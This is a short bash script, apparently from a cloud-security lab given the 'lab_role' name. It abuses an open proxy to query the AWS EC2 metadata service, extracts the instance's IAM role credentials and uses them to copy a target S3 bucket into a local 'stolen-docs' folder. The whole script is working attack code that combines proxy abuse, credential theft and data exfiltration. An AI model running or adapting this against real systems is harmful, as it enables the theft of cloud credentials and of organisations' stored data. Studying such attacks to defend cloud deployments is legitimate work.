#!/usr/bin/env bash

set -euo pipefail

readonly PROXY=$1
readonly AWS_METADATA=http://169.254.169.254/latest/meta-data/
readonly DEST=/tmp/stolen-docs

main () {
    echo "Testing ${PROXY} for open proxy"
    echo "Metadata service returned: $(test_for_open_proxy)"
    local creds=$(get_ec2_credentials)

    download_docs "$creds"
}

test_for_open_proxy () {
   metadata instance-id
}

get_ec2_credentials () {
    metadata iam/security-credentials/lab_role
}

download_docs () {
    readonly TARGET=$(aws s3 ls | grep target | awk -F ' ' '{print $3}')
    
    export AWS_ACCESS_KEY_ID=$(echo "${1}" | jq -r .AccessKeyId)
    export AWS_SECRET_ACCESS_KEY=$(echo "${1}" | jq -r .SecretAccessKey)
    export AWS_SESSION_TOKEN=$(echo "${1}" | jq -r .Token)
    echo "Using $AWS_ACCESS_KEY_ID, $AWS_SECRET_ACCESS_KEY and Token to download data"
    
    rm -rf /tmp/stolen-docs
    mkdir -p /tmp/stolen-docs
     
    aws s3 sync s3://"${TARGET}" "${DEST}"
}

metadata () {
    curl --silent ${AWS_METADATA}/${1} --proxy http://${PROXY}:81
}

main